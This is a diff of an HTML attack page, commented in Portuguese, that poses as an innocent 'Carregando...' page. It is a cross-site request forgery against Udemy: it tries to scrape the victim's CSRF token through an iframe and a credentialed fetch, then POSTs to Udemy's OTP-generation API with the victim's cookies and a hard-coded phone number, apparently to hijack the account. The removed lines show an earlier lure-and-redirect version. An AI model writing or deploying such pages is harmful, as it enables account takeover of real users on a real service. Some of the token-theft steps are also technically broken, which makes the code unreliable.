@@ -1,34 +1,93 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Artigo Informativo</title>
+    <title>Página Inocente</title>
 </head>
 <body>
-    <h1>InformaÃÂÃÂ§ÃÂÃÂµes Importantes</h1>
-    <p>ConteÃÂÃÂºdo atrativo que mantÃÂÃÂ©m a vÃÂÃÂ­tima lendo...</p>
+    <h1>Carregando...</h1>
     
-    <a href="https://site-legitimo.com" target="_blank" id="link-seguro">Clique aqui para mais informaÃÂÃÂ§ÃÂÃÂµes</a>
+    <!-- Primeira fase: GET para uma página do site que contém o token CSRF -->
+    <!-- Como é GET, os cookies SameSite=Lax serão enviados -->
+    <iframe id="tokenGrabber" src="https://www.udemy.com/user/edit-account/" style="width:100;height:100;border:0;"></iframe>
     
     <script>
-        document.getElementById('link-seguro').addEventListener('click', function() {
-            
-            setTimeout(function() {
+        // Segunda fase: extrair o token e fazer o POST
+        window.addEventListener('message', function(event) {
+            if (event.origin === "https://www.udemy.com/") {
+            	console.log("event? ", event);
+                var token = event.data.token;
                 
-                document.body.innerHTML = '<h1>Carregando...</h1>';
-                
-                // Executa o CSRF
+                // Agora usamos o token capturado para fazer o POST
                 var xhr = new XMLHttpRequest();
                 xhr.open('POST', 'https://www.udemy.com/api-2.0/auth/non-auth-otp/generate/', true);
                 xhr.withCredentials = true;
                 xhr.setRequestHeader('Content-Type', 'application/json');
+                xhr.setRequestHeader('X-CSRF-Token', token); 
                 xhr.send(JSON.stringify({
                     "purpose": 3,
                     "phone_number": "+5514996810417"
                 }));
-                
-                window.location.href = "https://alanls1.github.io/test/";
-            }, 1000);
+            }
         });
+        
+        // Script no iframe que extrairia o token e o enviaria via postMessage
+        setTimeout(function() {
+            var iframe = document.getElementById('tokenGrabber');
+            var script = document.createElement('script');
+            script.textContent = `
+                // Código para encontrar o token CSRF na página e enviá-lo de volta
+                var token = document.querySelector('meta[name="csrfToken"]')?.getAttribute('content');
+                window.parent.postMessage({token: token}, "*");
+            `;
+            
+            try {
+                iframe.contentDocument.body.appendChild(script);
+            } catch(e) {
+                console.log("Erro ao acessar iframe: " + e);
+            }
+        }, 2000);
+    </script>
+    <script>
+        // Etapa 1: Fazer uma requisição GET para uma página onde o token está disponível
+        fetch('https://www.udemy.com/user/edit-account/', {
+            method: 'GET',
+            credentials: 'include' // Envia cookies (permitido com SameSite=Lax para GET)
+        })
+        .then(response => response.text())
+        .then(html => {
+            // Etapa 2: Extrair o token CSRF do HTML recebido
+            const parser = new DOMParser();
+            const doc = parser.parseFromString(html, 'text/html');
+            
+            // Procura o token em diferentes lugares comuns
+            let token = doc.querySelector('meta[name="csrfToken"]')?.getAttribute('content');
+            if (!token) token = doc.querySelector('input[name="_csrf"]')?.value;
+            if (!token) {
+                // Tenta extrair via regex de um script
+                const match = html.match(/"csrfToken":\s*"([^"]+)"/);
+                if (match) token = match[1];
+            }
+            
+            if (token) {
+                // Etapa 3: Usar o token para fazer o POST autenticado
+                fetch('https://www.udemy.com/api-2.0/auth/non-auth-otp/generate/', {
+                    method: 'POST',
+                    credentials: 'include',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'X-CSRF-Token': token
+                    },
+                    body: JSON.stringify({
+                        "purpose": 3,
+                        "phone_number":  "+5514996810417"
+                    })
+                })
+                .then(response => {
+                    console.log("Requisição enviada, status:", response.status);
+                });
+            }
+        })
+        .catch(error => console.error('Erro:', error));
     </script>
 </body>
 </html>
